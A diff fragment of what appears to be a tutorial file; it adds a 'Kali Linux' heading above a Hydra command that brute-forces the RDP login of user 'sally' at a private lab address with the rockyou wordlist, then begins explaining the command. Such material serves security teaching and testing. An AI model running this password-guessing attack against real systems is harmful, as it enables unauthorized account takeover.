@@ -6,7 +6,7 @@
 
 
 
-
+# Kali Linux
 - On Kali linux type this command into the command prompt: hydra -t 1 -V -f -l sally -P rockyou.txt 192.168.0.24 rdp
 - Here is what the command does:
 - hydra	- Run the Hydra login-testing tool
